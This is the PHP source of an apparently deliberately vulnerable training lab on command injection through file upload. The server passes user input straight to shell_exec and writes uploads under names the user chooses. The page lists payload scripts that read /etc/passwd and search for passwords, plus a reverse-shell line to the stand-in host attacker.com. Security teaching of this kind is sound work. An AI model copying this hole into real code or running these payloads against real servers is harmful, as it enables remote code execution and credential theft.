<?php
// Lab 3: Command Injection via File Upload
// Vulnerability: Command injection attacks through file upload functionality

session_start();

$message = '';
$command_output = '';
$uploaded_files = [];

// Initialize uploaded files if not exists
if (!isset($_SESSION['uploaded_files'])) {
    $_SESSION['uploaded_files'] = [];
}

$uploaded_files = $_SESSION['uploaded_files'];

// Simulate command execution for uploaded files (vulnerable to injection)
function execute_uploaded_command($command) {
    // Vulnerable: Direct execution without validation
    if (empty($command)) {
        return "No command specified.";
    }
    
    // Vulnerable: Direct execution using shell_exec
    $output = @shell_exec($command . ' 2>&1');
    
    if ($output === null) {
        return "Command execution failed or no output.";
    }
    
    return $output;
}

// Handle file upload
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['upload_file'])) {
    $file_content = $_POST['file_content'] ?? '';
    $file_name = $_POST['file_name'] ?? 'uploaded_file.txt';
    $file_type = $_POST['file_type'] ?? 'text/plain';
    
    if ($file_content && $file_name) {
        $file_data = [
            'name' => $file_name,
            'content' => $file_content,
            'type' => $file_type,
            'size' => strlen($file_content),
            'uploaded_at' => date('Y-m-d H:i:s')
        ];
        
        // Save file to uploads directory
        if (!file_exists('uploads')) {
            mkdir('uploads', 0755, true);
        }
        
        $file_path = 'uploads/' . $file_name;
        file_put_contents($file_path, $file_content);
        
        $_SESSION['uploaded_files'][] = $file_data;
        $uploaded_files = $_SESSION['uploaded_files'];
        $message = '<div class="alert alert-success">File uploaded successfully!</div>';
    } else {
        $message = '<div class="alert alert-danger">Please provide both file name and content!</div>';
    }
}

// Handle file deletion
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['delete_file'])) {
    $file_index = (int)($_POST['file_index'] ?? -1);
    
    if ($file_index >= 0 && $file_index < count($uploaded_files)) {
        $file = $uploaded_files[$file_index];
        $file_path = 'uploads/' . $file['name'];
        if (file_exists($file_path)) {
            unlink($file_path);
        }
        
        unset($_SESSION['uploaded_files'][$file_index]);
        $_SESSION['uploaded_files'] = array_values($_SESSION['uploaded_files']);
        $uploaded_files = $_SESSION['uploaded_files'];
        $message = '<div class="alert alert-success">File deleted successfully!</div>';
    } else {
        $message = '<div class="alert alert-danger">Invalid file index!</div>';
    }
}

// Handle command execution
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['execute_command'])) {
    $user_input = $_POST['command'] ?? '';
    
    if ($user_input) {
        $command_output = execute_uploaded_command($user_input);
        
        if (strpos($command_output, 'Command execution failed') !== false) {
            $message = '<div class="alert alert-danger">Command execution failed!</div>';
        } else {
            $message = '<div class="alert alert-success">Command executed successfully!</div>';
        }
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lab 3: Command Injection via File Upload - Command Injection Labs</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.9.1/font/bootstrap-icons.css">
    
    <style>
        :root {
            --primary-dark: #1a1f36;
            --accent-green: #48bb78;
            --accent-blue: #4299e1;
            --accent-orange: #ed8936;
            --accent-red: #f56565;
        }
        
        body {
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
            color: #e2e8f0;
            min-height: 100vh;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        .navbar-brand {
            font-weight: 700;
            font-size: 1.5rem;
            color: var(--accent-green) !important;
        }

        .nav-link {
            font-weight: 500;
            transition: color 0.3s;
        }

        .nav-link:hover {
            color: var(--accent-green) !important;
        }

        .hero-section {
            background: linear-gradient(rgba(15, 23, 42, 0.9), rgba(15, 23, 42, 0.9)), 
                        url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect width="100" height="100" fill="%231e293b"/><path d="M0 0L100 100M100 0L0 100" stroke="%23374151" stroke-width="1"/></svg>');
            padding: 2rem 0;
            border-bottom: 1px solid #2d3748;
            margin-bottom: 2rem;
        }

        .hero-title {
            font-size: 2rem;
            font-weight: 700;
            background: linear-gradient(90deg, #48bb78, #4299e1);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 0.5rem;
        }

        .hero-subtitle {
            font-size: 1rem;
            color: #cbd5e0;
        }

        .section-title {
            margin-top: 30px;
            margin-bottom: 20px;
            font-weight: 700;
            font-size: 1.5rem;
            position: relative;
            padding-bottom: 10px;
        }

        .section-title::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            width: 60px;
            height: 4px;
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border-radius: 2px;
        }

        .card {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            color: #e2e8f0;
        }

        .card-header {
            background: rgba(15, 23, 42, 0.5);
            border-bottom: 1px solid #334155;
            font-weight: 600;
            padding: 1rem 1.5rem;
        }

        .form-control, .form-select {
            background: rgba(30, 41, 59, 0.7);
            border: 1px solid #334155;
            color: #e2e8f0;
            padding: 0.75rem 1rem;
        }

        .form-control:focus, .form-select:focus {
            background: rgba(30, 41, 59, 0.9);
            border-color: var(--accent-green);
            box-shadow: 0 0 0 0.2rem rgba(72, 187, 120, 0.25);
            color: #e2e8f0;
        }

        .form-label {
            font-weight: 500;
            color: #cbd5e0;
        }

        .btn-primary {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border: none;
            padding: 0.75rem 1.5rem;
            font-weight: 600;
            transition: all 0.3s;
        }

        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(72, 187, 120, 0.3);
        }

        .vulnerability-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-orange);
        }

        .payload-examples {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-blue);
        }

        .danger-zone {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-red);
        }

        pre {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            color: #e2e8f0;
            border: 1px solid #334155;
            overflow-x: auto;
        }

        .lab-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
        }

        .lab-badge {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            color: #1a202c;
            font-weight: 600;
            padding: 0.5rem 1rem;
            border-radius: 6px;
            display: inline-block;
            margin-bottom: 1rem;
        }

        .command-display {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            margin: 1rem 0;
            border-left: 4px solid var(--accent-green);
        }

        .test-urls {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin-bottom: 1rem;
            border-left: 4px solid var(--accent-blue);
        }

        .command-info {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
        }

        .sensitive-data {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-red);
        }

        .code-block {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-blue);
            font-family: 'Courier New', monospace;
            white-space: pre-wrap;
        }
    </style>
</head>
<body>
    <nav class="navbar navbar-expand-md navbar-dark sticky-top" style="background-color: var(--primary-dark);">
        <div class="container-fluid">
            <a class="navbar-brand" href="index.php">
                <i class="bi bi-arrow-left me-2"></i>Back to Command Injection Labs
            </a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse"
                data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false"
                aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>

            <div class="collapse navbar-collapse" id="navbarSupportedContent">
                <ul class="navbar-nav me-auto mb-2 mb-lg-0">
                    <li class="nav-item">
                        <a class="nav-link active" href="../about">About</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link active" href="../contact">Contact Us</a>
                    </li>
                </ul>
            </div>
        </div>
    </nav>

    <div class="hero-section">
        <div class="container">
            <h1 class="hero-title">Lab 3: Command Injection via File Upload</h1>
            <p class="hero-subtitle">Command injection attacks through file upload functionality</p>
        </div>
    </div>

    <div class="container mb-5">
        <div class="lab-info">
            <span class="lab-badge">Difficulty: Medium</span>
            <h3 class="section-title">Lab Overview</h3>
            <p>This lab demonstrates command injection vulnerabilities that can be exploited through file upload functionality. Attackers can upload files containing malicious commands or reference uploaded files that get processed and executed on the server.</p>
            <p><strong>Objective:</strong> Use file upload functionality to achieve command injection and code execution.</p>
        </div>

        <div class="row">
            <div class="col-lg-6">
                <div class="card mb-4">
                    <div class="card-header text-center">
                        <i class="bi bi-code-slash me-2"></i>Vulnerable Code
                    </div>
                    <div class="card-body">
                        <pre>
// Vulnerable: Direct execution without validation
function execute_uploaded_command($command) {
    if (empty($command)) {
        return "No command specified.";
    }
    
    // Vulnerable: Direct execution using shell_exec
    $output = @shell_exec($command . ' 2>&1');
    
    if ($output === null) {
        return "Command execution failed or no output.";
    }
    
    return $output;
}</pre>
                    </div>
                </div>
            </div>
            
            <div class="col-lg-6">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-upload me-2"></i>File Upload
                    </div>
                    <div class="card-body">
                        <?php echo $message; ?>
                        
                        <form method="POST">
                            <input type="hidden" name="upload_file" value="1">
                            <div class="mb-3">
                                <label for="file_name" class="form-label">File Name</label>
                                <input type="text" class="form-control" id="file_name" name="file_name" 
                                       placeholder="Enter file name...">
                            </div>
                            <div class="mb-3">
                                <label for="file_type" class="form-label">File Type</label>
                                <select class="form-select" id="file_type" name="file_type">
                                    <option value="text/plain">Text File</option>
                                    <option value="text/html">HTML File</option>
                                    <option value="application/x-php">PHP File</option>
                                    <option value="text/shell">Shell Script</option>
                                </select>
                            </div>
                            <div class="mb-3">
                                <label for="file_content" class="form-label">File Content</label>
                                <textarea class="form-control" id="file_content" name="file_content" 
                                          rows="4" placeholder="Enter file content...">#!/bin/bash
echo "Hello World!"
whoami
id</textarea>
                            </div>
                            <button type="submit" class="btn btn-primary">Upload File</button>
                        </form>
                    </div>
                </div>
            </div>
        </div>

        <div class="row mt-4">
            <div class="col-12">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-files me-2"></i>Uploaded Files
                    </div>
                    <div class="card-body">
                        <?php if (empty($uploaded_files)): ?>
                            <p class="text-muted">No files uploaded yet.</p>
                        <?php else: ?>
                            <?php foreach ($uploaded_files as $index => $file): ?>
                                <div class="command-info">
                                    <h5>File <?php echo $index + 1; ?>: <?php echo htmlspecialchars($file['name']); ?></h5>
                                    <p><strong>Type:</strong> <?php echo htmlspecialchars($file['type']); ?></p>
                                    <p><strong>Size:</strong> <?php echo number_format($file['size']); ?> bytes</p>
                                    <p><strong>Uploaded:</strong> <?php echo htmlspecialchars($file['uploaded_at']); ?></p>
                                    
                                    <div class="mt-2">
                                        <form method="POST" class="d-inline">
                                            <input type="hidden" name="execute_command" value="1">
                                            <input type="hidden" name="command" value="cat uploads/<?php echo htmlspecialchars($file['name']); ?>">
                                            <button type="submit" class="btn btn-sm btn-primary">View File</button>
                                        </form>
                                        <form method="POST" class="d-inline">
                                            <input type="hidden" name="execute_command" value="1">
                                            <input type="hidden" name="command" value="bash uploads/<?php echo htmlspecialchars($file['name']); ?>">
                                            <button type="submit" class="btn btn-sm btn-success">Execute File</button>
                                        </form>
                                        <form method="POST" class="d-inline">
                                            <input type="hidden" name="delete_file" value="1">
                                            <input type="hidden" name="file_index" value="<?php echo $index; ?>">
                                            <button type="submit" class="btn btn-sm btn-danger">Delete</button>
                                        </form>
                                    </div>
                                </div>
                            <?php endforeach; ?>
                        <?php endif; ?>
                    </div>
                </div>
            </div>
        </div>

        <div class="row mt-4">
            <div class="col-12">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-terminal me-2"></i>Command Execution
                    </div>
                    <div class="card-body">
                        <form method="POST">
                            <input type="hidden" name="execute_command" value="1">
                            <div class="mb-3">
                                <label for="command" class="form-label">Command to Execute</label>
                                <input type="text" class="form-control" id="command" name="command" 
                                       placeholder="Enter command...">
                            </div>
                            <button type="submit" class="btn btn-primary">Execute Command</button>
                        </form>
                    </div>
                </div>
            </div>
        </div>

        <?php if ($command_output): ?>
        <div class="row mt-4">
            <div class="col-12">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-terminal me-2"></i>Command Output
                    </div>
                    <div class="card-body">
                        <div class="command-display">
                            <h5>Command Result</h5>
                            <div class="sensitive-data">
                                <pre><?php echo htmlspecialchars($command_output); ?></pre>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <?php endif; ?>

        <div class="row mt-4">
            <div class="col-md-6">
                <div class="vulnerability-info">
                    <h5><i class="bi bi-bug me-2"></i>Vulnerability Details</h5>
                    <ul>
                        <li><strong>Type:</strong> Command Injection via File Upload</li>
                        <li><strong>Severity:</strong> High</li>
                        <li><strong>Method:</strong> POST</li>
                        <li><strong>Issue:</strong> Direct execution of uploaded files and commands</li>
                    </ul>
                </div>
            </div>
            
            <div class="col-md-6">
                <div class="payload-examples">
                    <h5><i class="bi bi-target me-2"></i>File Upload Command Injection Examples</h5>
                    <ul>
                        <li><code>malicious.sh</code> - Upload shell script</li>
                        <li><code>whoami</code> - Basic command</li>
                        <li><code>cat uploads/file.txt</code> - Read uploaded file</li>
                        <li><code>bash uploads/script.sh</code> - Execute uploaded script</li>
                    </ul>
                </div>
            </div>
        </div>

        <div class="test-urls">
            <h5><i class="bi bi-link me-2"></i>File Upload Command Injection Payloads</h5>
            <p>Upload these files to test command injection vulnerabilities:</p>
            
            <h6>1. Basic Shell Script (script.sh):</h6>
            <div class="code-block">#!/bin/bash
echo "Hacked!"
whoami
id
pwd
ls -la</div>

            <h6>2. Information Gathering Script (info.sh):</h6>
            <div class="code-block">#!/bin/bash
echo "System Information:"
echo "User: $(whoami)"
echo "ID: $(id)"
echo "PWD: $(pwd)"
echo "Hostname: $(hostname)"
echo "Uname: $(uname -a)"
echo "Date: $(date)"</div>

            <h6>3. File System Access Script (filesystem.sh):</h6>
            <div class="code-block">#!/bin/bash
echo "File System Access:"
echo "Passwd:"
cat /etc/passwd
echo "Hosts:"
cat /etc/hosts
echo "Directory Listing:"
ls -la /</div>

            <h6>4. Process Information Script (process.sh):</h6>
            <div class="code-block">#!/bin/bash
echo "Process Information:"
ps aux
echo "Network:"
netstat -an
echo "Disk Usage:"
df -h
echo "Memory:"
free -m</div>

            <h6>5. Network Information Script (network.sh):</h6>
            <div class="code-block">#!/bin/bash
echo "Network Information:"
ifconfig
echo "Routes:"
route -n
echo "ARP:"
arp -a
echo "DNS:"
nslookup google.com</div>

            <h6>6. User Information Script (user.sh):</h6>
            <div class="code-block">#!/bin/bash
echo "User Information:"
groups
echo "Crontab:"
crontab -l
echo "History:"
history
echo "Environment:"
env</div>

            <h6>7. Reverse Shell Script (reverse.sh):</h6>
            <div class="code-block">#!/bin/bash
bash -i >& /dev/tcp/attacker.com/4444 0>&1</div>

            <h6>8. Command Execution Script (exec.sh):</h6>
            <div class="code-block">#!/bin/bash
echo "Command Execution:"
whoami
id
pwd
ls -la
ps aux
netstat -an</div>

            <h6>9. File Operations Script (fileops.sh):</h6>
            <div class="code-block">#!/bin/bash
echo "File Operations:"
touch /tmp/test.txt
echo "test" > /tmp/test.txt
cat /tmp/test.txt
rm /tmp/test.txt
mkdir /tmp/testdir
rmdir /tmp/testdir</div>

            <h6>10. Advanced Commands Script (advanced.sh):</h6>
            <div class="code-block">#!/bin/bash
echo "Advanced Commands:"
find / -name "*.php" 2>/dev/null
grep -r "password" /var/www/ 2>/dev/null
find / -perm -4000 2>/dev/null
find / -writable 2>/dev/null</div>

            <h6>11. Command Execution via Uploaded Files:</h6>
            <div class="code-block">cat uploads/script.sh
bash uploads/script.sh
chmod +x uploads/script.sh && ./uploads/script.sh
source uploads/script.sh</div>

            <h6>12. File Reading via Uploaded Files:</h6>
            <div class="code-block">cat uploads/info.txt
head -10 uploads/data.txt
tail -10 uploads/log.txt
grep "error" uploads/log.txt</div>

            <h6>13. Process Execution via Uploaded Files:</h6>
            <div class="code-block">./uploads/script.sh
bash uploads/script.sh
sh uploads/script.sh
python uploads/script.py</div>

            <h6>14. File Manipulation via Uploaded Files:</h6>
            <div class="code-block">cp uploads/template.txt /tmp/
mv uploads/data.txt /tmp/
ln -s uploads/symlink.txt /tmp/
chmod 755 uploads/script.sh</div>
        </div>

        <div class="danger-zone">
            <h5><i class="bi bi-exclamation-triangle me-2"></i>Real-World Attack Scenarios</h5>
            <ul>
                <li>Upload malicious files containing commands</li>
                <li>Execute arbitrary commands through file upload</li>
                <li>Access sensitive files using uploaded scripts</li>
                <li>Bypass file upload restrictions and filters</li>
                <li>Compromise server through file upload functionality</li>
                <li>Compliance violations and security breaches</li>
            </ul>
        </div>

        <div class="card mt-4">
            <div class="card-header">
                <i class="bi bi-lightbulb me-2"></i>Mitigation Strategies
            </div>
            <div class="card-body">
                <ul>
                    <li>Implement proper file upload validation and sanitization</li>
                    <li>Use whitelist-based file type validation</li>
                    <li>Avoid direct command execution functions</li>
                    <li>Use parameterized commands and safe APIs</li>
                    <li>Implement proper access controls and permissions</li>
                    <li>Regular security testing and vulnerability assessments</li>
                    <li>Monitor for unusual file upload patterns and content</li>
                </ul>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
